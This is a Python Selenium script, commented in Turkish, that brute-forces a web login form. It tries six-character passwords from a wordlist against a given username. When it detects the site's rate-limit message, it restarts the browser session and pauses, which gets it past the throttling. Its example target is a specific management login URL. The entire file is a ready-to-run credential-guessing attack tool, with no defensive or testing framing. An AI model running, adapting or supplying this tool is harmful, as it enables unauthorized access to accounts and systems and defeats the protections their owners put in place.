import argparse
import sys
import time
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.firefox import GeckoDriverManager

def setup_browser_session(url):
    """
    Yeni bir tarayıcı oturumu başlatır, sayfayı açar ve giriş elementlerinin yüklenmesini bekler.
    Bu versiyon, önce yükleme ekranının kaybolmasını bekler.
    """
    print("\n[*] Yeni bir tarayıcı oturumu başlatılıyor...")
    service = FirefoxService(GeckoDriverManager().install())
    driver = webdriver.Firefox(service=service)
    
    driver.get(url)
    
    print("[*] Sayfa yüklendi. Yükleme ekranının (splash screen) kaybolması bekleniyor...")
    try:
        # 1. Yükleme ekranının kaybolmasını 30 saniyeye kadar bekle.
        # Sitenin kaynak kodunda <div class="splash-screen">...</div> gördük.
        wait = WebDriverWait(driver, 30)
        splash_screen_selector = (By.CLASS_NAME, "splash-screen")
        wait.until(EC.invisibility_of_element_located(splash_screen_selector))
        print("[*] Yükleme ekranı kayboldu.")

    except TimeoutException:
        # Eğer splash screen 30 saniyede kaybolmazsa, yine de devam etmeyi dene.
        print("[!] Yükleme ekranı 30 saniye içinde kaybolmadı, yine de devam ediliyor...")

    # 2. Şimdi giriş formunun elementlerini ara.
    print("[*] Giriş formu elementleri aranıyor...")
    form_wait = WebDriverWait(driver, 15) 

    PASSWORD_SELECTOR = (By.CSS_SELECTOR, "input[type='password']")
    password_field = form_wait.until(EC.visibility_of_element_located(PASSWORD_SELECTOR))
    
    USERNAME_SELECTOR = (By.XPATH, "//input[@type='password']/preceding::input[1]")
    username_field = form_wait.until(EC.visibility_of_element_located(USERNAME_SELECTOR))
    
    LOGIN_BUTTON_SELECTOR = (By.CSS_SELECTOR, "button[type='submit']")
    login_button = form_wait.until(EC.element_to_be_clickable(LOGIN_BUTTON_SELECTOR))
    
    print("[*] Giriş elementleri bulundu ve sayfa hazır.")
    return driver, username_field, password_field, login_button


def main():
    parser = argparse.ArgumentParser(description='Akıllı Rate Limit Tespiti Yapan Bruteforce Aracı.')
    parser.add_argument('url', help='Hedef web sitesinin URL\'si (örn: https://mgmt.yenihavale.net/login)')
    parser.add_argument('-u', '--username', required=True, help='Kullanılacak kullanıcı adı.')
    parser.add_argument('-w', '--wordlist', required=True, help='Denenecek şifrelerin bulunduğu dosya.')

    args = parser.parse_args()

    print(f"[*] Hedef: {args.url}")
    print(f"[*] Kullanıcı Adı: {args.username}")
    print(f"[*] Şifre Listesi: {args.wordlist}")

    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            all_passwords = [line.strip() for line in f if line.strip()]
        
        passwords = [p for p in all_passwords if len(p) == 6]
        
        print(f"[*] Kelime listesindeki toplam {len(all_passwords)} şifreden, {len(passwords)} tanesi 6 haneli olarak filtrelendi.")

        if not passwords:
            print("[!] Hata: Belirtilen listede 6 haneli şifre bulunamadı.", file=sys.stderr)
            sys.exit(1)

    except FileNotFoundError:
        print(f"Hata: '{args.wordlist}' kelime listesi dosyası bulunamadı.", file=sys.stderr)
        sys.exit(1)

    current_password_index = 0
    found_password = None
    
    while current_password_index < len(passwords) and not found_password:
        driver = None
        rate_limited = False
        try:
            driver, username_field, password_field, login_button = setup_browser_session(args.url)
            username_field.send_keys(args.username)
            print(f"[*] Denemelere {current_password_index + 1}. şifreden devam ediliyor...")

            for i in range(current_password_index, len(passwords)):
                password = passwords[i]
                current_password_index = i
                
                print(f"[*] Denenen: {password}", end='\r')
                
                password_field.clear()
                password_field.send_keys(password)
                login_button.click()
                
                try:
                    WebDriverWait(driver, 3).until(lambda d: args.url not in d.current_url)
                    
                    current_url = driver.current_url
                    print(f"\n\n[+] BAŞARILI! Şifre bulundu: {password}")
                    print(f"    -> Yönlendirilen URL: {current_url}")
                    found_password = password
                    print("Tarayıcı 30 saniye sonra kapanacak...")
                    time.sleep(30)
                    break 
                except TimeoutException:
                    try:
                        rate_limit_xpath = "//*[contains(text(), 'Çok fazla istek gönderdiniz') or contains(text(), 'daha sonra tekrar deneyiniz')]"
                        WebDriverWait(driver, 1).until(EC.visibility_of_element_located((By.XPATH, rate_limit_xpath)))
                        
                        print("\n[!] Rate limit mesajı tespit edildi! Oturum yeniden başlatılacak.")
                        rate_limited = True
                        break 
                    except TimeoutException:
                        continue
        
        except Exception as e:
            print(f"\n[!] Oturumda beklenmedik bir hata oluştu ({type(e).__name__}). Oturum yeniden başlatılacak.")
            
        finally:
            if driver:
                driver.quit()
                print("[*] Tarayıcı oturumu kapatıldı.")
        
        if found_password:
            break

        if rate_limited or (not found_password and current_password_index < len(passwords)):
            print("[!] Yeni oturumdan önce 30 saniye bekleniyor...")
            time.sleep(30)
    
    if not found_password:
        print("\n[-] Tüm denemeler bitti. Şifre bulunamadı.")
    
    print("[*] Araç kapatıldı.")

if __name__ == '__main__':
    main() 